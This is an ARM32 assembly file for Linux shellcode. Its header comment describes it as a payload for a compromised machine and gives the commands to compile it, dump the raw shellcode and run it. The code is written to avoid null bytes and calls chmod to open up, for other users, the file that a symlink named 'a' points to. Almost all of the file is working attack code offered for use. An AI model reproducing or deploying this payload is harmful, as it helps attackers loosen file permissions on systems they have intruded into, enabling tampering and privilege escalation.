/*

Author: Abhinav Thakur
File:   chmod_symlink.s

PoE:
	This machine code when executed on a compromised machine, will make the binary named "a" 
	(either	directly present or pointed to by symbolic link) accessible ("RWX") to the entire world.
	Just create a symbolic link named "a" in process root directory.

$ ln -s /<any_file_path> a

Compile:
	$ arm-linux-gnueabi-gcc -Wl,-N -nostdlib -static chmod_symlink.s -o ./chmod_symlink.elf
Dump shellcode :
	$ arm-linux-gnueabi-objcopy --dump-section .text=chmod_symlink.raw ./chmod_symlink.elf
Run            :
	$ ./chmod_symlink.elf

~~ SYSCALL conventions for ARM32
move parameters into => r0, r1, r2, r3, r4, r5
move syscall number  => r7
find return value in => r0

*/

.global _start
_start:

	.code 32
	add r3, pc, #1
	bx r3

	.code 16
	// chmod_symlink ("a", 07);
	mov r7, #15
	adr r0, binaryPath
	eor r1, r1, r1
	strb r1, [r0, #1]		// fixup r0 before use 
	mov r1, #07
	svc #1
	
	
binaryPath:
.ascii "aX"

